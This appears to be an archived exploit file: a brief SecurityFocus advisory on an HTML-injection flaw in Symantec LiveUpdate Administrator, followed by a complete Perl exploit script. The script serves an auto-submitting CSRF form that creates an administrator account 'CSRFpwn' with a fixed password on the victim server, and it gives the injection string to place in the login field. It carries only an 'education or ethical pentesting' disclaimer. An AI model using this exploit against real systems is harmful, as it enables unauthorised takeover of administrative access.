@@ -1,0 +1,157 @@
+Source: http://www.securityfocus.com/bid/46856/info
+
+Symantec LiveUpdate Administrator is prone to an HTML-injection vulnerability.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected application, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+
+#!/usr/bin/perl
+
+##
+#  Title:     Symantec Live Update Administrator CSRF Exploit
+#  Name:      luaCSRF.pl
+#  Author:    Nikolas Sotiriu (lofi) <lofi[at]sotiriu.de>
+#
+#  Use it only for education or ethical pentesting! The author accepts
+#  no liability for damage caused by this tool.
+#
+##
+
+
+use Socket;
+use IO::Handle;
+use Getopt::Std;
+
+my %args;
+getopt('g:h:', \%args);
+
+my $payload     = $args{g} || usage();
+my $victim      = $args{h} || usage();
+
+banner();
+
+if ($payload eq "1") {
+        print "[+] Using the Alert Box payload\n";
+        # Alert Box
+        $html = <<ENDHTML;
+<html>
+<SCRIPT LANGUAGE="JavaScript">alert('!!!XSS/CSRF vulnerability!!!')</SCRIPT>
+</html>
+
+ENDHTML
+
+} elsif ($payload eq "2") {
+        print "[+] Using the add admin user payload\n";
+        # Adds the user CSRFpwn with password 12345678
+        $html = <<ENDHTML;
+<html>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://$victim:7070/lua/adduser.do" method="post">
+                <input type="hidden" name="dispatch" value="save" />
+                <input type="hidden" name="username" value="CSRFpwn" />
+                <input type="hidden" name="password" value="12345678"/>
+                <input type="hidden" name="verifyPassword" value="12345678"/>
+                <input type="hidden" name="lastname" value="junk" />
+                <input type="hidden" name="firstname" value="junk" />
+                <input type="hidden" name="email" value="junk&#64;junk.com" />
+                <input type="hidden" name="userRole" value="1" />
+            </form>
+        </body>
+</html>
+
+ENDHTML
+
+}
+
+my $protocol = getprotobyname('tcp');
+
+socket(SOCK, AF_INET, SOCK_STREAM, $protocol) or die "[-] socket() failed: $!";
+setsockopt(SOCK,SOL_SOCKET,SO_REUSEADDR,1) or die "[-] Can't set SO_REUSEADDR: $!";
+my $my_addr = sockaddr_in(80,INADDR_ANY);
+bind(SOCK,$my_addr) or die "[-] bind() failed: $!";
+listen(SOCK,SOMAXCONN) or die "[-] listen() failed: $!";
+warn "[+] waiting for incoming connections on port 80...\n";
+warn "[+] Enter the following String in the LUA username login field\n";
+warn "[+] (e.q. HTTP/SSH) and wair for the admin to view the Logs\n";
+warn "[+]\n";
+warn "[+] <frame src=http://<LOCAL_ADDRESS>/.html>\n";
+
+$repeat = 1;
+$victim = inet_aton("0.0.0.0");
+while($repeat) {
+    my $remote_addr = accept(SESSION,SOCK);
+    my ($port,$hisaddr) = sockaddr_in($remote_addr);
+    warn "[+] Connection from [",inet_ntoa($hisaddr),",$port]\n";
+    $victim = $hisaddr;
+    SESSION->autoflush(1);
+    if(<SESSION>) {
+       print SESSION $http_header . $html;
+    }
+    warn "[+] Connection from [",inet_ntoa($hisaddr),",$port] finished\n";
+    close SESSION;
+}
+
+sub usage {
+print $payload;
+    print "\n";
+    print " luaCSRF.pl - Symantec LUA CSRF Exploit\n";
+    print "===============================================================\n\n";
+    print "  Usage:\n";
+    print "           $0 -g <payload> -h <lua-ip>\n";
+    print "  Optional:\n";
+    print "           -p       <local port to listen on>\n";
+    print "           -g (1|2) <payload to use>\n";
+    print "                    1 <Execute an alert box\n";
+    print "                    2 <Add the Admin User \"CSRFpwn\">\n";
+    print "  Notes:\n";
+    print "           -nothing here\n";
+    print "\n";
+    print "  Author:\n";
+    print "           Nikolas Sotiriu (lofi)\n";
+    print "           url: www.sotiriu.de\n";
+    print "           mail: lofi[at]sotiriu.de\n";
+    print "\n";
+
+
+    exit(1);
+}
+
+sub banner {
+        print STDERR << "EOF";
+--------------------------------------------------------------------------------
+               luaCSRF.pl - Symantec LUA CSRF Exploit
+--------------------------------------------------------------------------------
+
+                                   111 1111111
+                            11100 101 00110111001111
+                        11101 11 10 111 101 1001111111
+                    1101  11 00 10 11  11 111 1111111101
+                 10111 1 10 11 10  0 10  1 1 1  1111111011
+              1111  1 1 10  0  01 01 01 1 1 111     1111011101
+            1000   0 11 10 10  0 10 11 111 11111 11 1111 111100
+          1111111111 01 10 10 11 01 0  11 11111111111 1 1111  11
+         10111110 0  01 00 11 1110 11 10 11111111111 11 11111  11   111
+        101111111 0 10  01 11 1 11 0 10 11 1111111111111111 1111110000111
+        011111 0110 10 10  0 11 1 11 01 01 111111111111111 1 11110011001
+       1011111 0110 10 11 1110 11 1 10 11111111111111111111  1 100  001
+       1011111 0 10 10 01 1  0 1 11 1 111111111111111111111111 001101
+        011111 0  0  0 11 0 1111 0 11 01111111111111111111111111  01
+       1111111 01 01 111  1 1111 1 11 1111111111111111111111 1101 1111
+      111 1111 10  0 111110 0111 0 1  0111111111111111111111 11111 1111
+     111 11111  1  11 1 1 1    111 11 11111111111111111111111110    1001
+    111 1011111   1 11111111110111111111111111111111111111111 01 10111001
+   11 1100    10110110    10001        11101111111111111111  10 111 11100
+  111  00      1011101      00101       0  11111111111111111001 11  111101
+  11  00        00 101      1000011     1011   1111   1111111000 1111111 0
+  11 00          0   1011      100001    101000 1 1001         00001111  01
+  01101          11111 1011               01100    0101          110  11 10
+  10111                   1                0  01    0000011         10    10
+   10011                                    11100       1111         101   11
+      1110 01                                 101011                   1001100
+         1111000011                            1  111
+                11000001111
+                           1
+
+EOF
+}
+
